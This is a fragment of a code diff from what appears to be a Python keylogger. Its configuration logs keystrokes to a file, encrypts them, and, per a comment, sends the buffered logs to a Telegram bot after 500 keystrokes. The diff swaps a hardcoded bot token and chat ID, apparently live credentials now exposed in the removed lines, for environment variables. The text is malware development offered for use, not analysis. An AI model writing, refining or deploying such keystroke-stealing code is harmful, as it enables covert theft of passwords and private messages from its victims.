@@ -5,12 +5,15 @@ import datetime
 import requests
 import threading
 from cryptography.fernet import Fernet
-
+from dotenv import load_dotenv
+load_dotenv()
 # Configuration
 LOG_FILE = "keystrokes.log"
 ENCRYPTION_KEY_FILE = "key.key"
-BOT_TOKEN = "7810570268:AAFIjIdVdQhHTn-R1xrwpyG3OJyUdlJsD0o"
-CHAT_ID = "1259051531"
+# Telegram bot api / BOT Token
+BOT_TOKEN = os.getenv("Bot_t")
+# Bot Chat ID
+CHAT_ID = os.getenv('Chat_id')
 BUFFER_LIMIT = 500  # Number of keystrokes before sending logs
 
 log_buffer = []  # Store logs in memory
